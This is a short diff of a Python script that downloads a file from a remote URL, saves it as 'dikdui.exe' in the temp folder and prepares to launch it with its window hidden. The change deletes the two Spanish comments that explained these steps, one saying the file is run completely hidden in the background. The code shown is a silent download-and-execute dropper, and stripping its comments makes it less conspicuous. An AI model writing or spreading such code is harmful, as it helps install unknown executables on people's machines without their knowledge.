@@ -7,7 +7,6 @@ NAME = "dikdui.exe"
 def main():
     p = os.path.join(tempfile.gettempdir(), NAME)
 
-    # Descargar archivo
     with requests.get(URL, stream=True, timeout=60, verify=certifi.where()) as r:
         r.raise_for_status()
         with open(p, "wb") as f:
@@ -15,7 +14,6 @@ def main():
                 if chunk:
                     f.write(chunk)
 
-    # Ejecutarlo en segundo plano completamente oculto
     si = subprocess.STARTUPINFO()
     si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
     CREATE_NO_WINDOW = 0x08000000
